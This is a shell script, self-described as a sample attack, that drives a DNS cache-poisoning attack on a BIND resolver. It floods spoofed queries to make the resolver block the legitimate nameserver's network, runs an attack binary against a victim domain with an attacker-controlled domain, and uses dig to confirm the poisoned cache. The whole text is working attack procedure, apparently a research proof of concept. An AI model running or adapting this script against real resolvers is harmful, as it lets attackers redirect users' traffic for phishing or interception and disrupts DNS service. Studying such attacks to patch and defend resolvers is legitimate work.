# This is a sample attack script and may not work properly. Please adjust the parameter accordingly.
# $1 for victim resolver IP, $2 for attacker-controlled domain, $3 for iface name, $4 for victim domain name, $5 for victim domain nameserver IP
# Verify the existing record domain, just for proof purposes.
# Please run with sudo.
echo 'Before attack:'
dig @$1 $4
echo '10s to start attack...'
sleep 10
cd ./DNSQuertFlood
# This is specifically for BIND. To prevent it from answering queries sent by 1.2.3.4, we spoof 1.2.3.250 to flood queries. BIND will then block all queries from the same /24 network.
./dns_query.sh $5 `echo $1 | sed -E 's/\.[0-9]*$/\.250/g'` 789 `echo $4 | sed "s/\./ /g"` &
cd ..
# Change the argument accordingly
time ./main -a $5 -b1 $1 -i $3 -n $4 -r $1 -t 50000 -ad $2 -tg 0 -s 10000 -e 65000 -j 0
# Kill the flooding process.
pkill hping
# Validations
echo 'After attack:'
dig @$1 $4
echo 'If there is no change in result, please wait for the original cache to expire. Otherwise please terminate the attack by Ctrl-C.'
sleeptime=`dig @$1 $4 | grep -o -P '[0-9]+[ \t]*IN' | head -n 1 | sed 's/IN//g'`
echo "Wait for $sleeptime seconds..."
sleep $sleeptime
echo 'Cache should be poisoned now:'
dig @$1 $4
echo 'Wait for another 2 seconds...'
sleep 2
dig @$1 $4
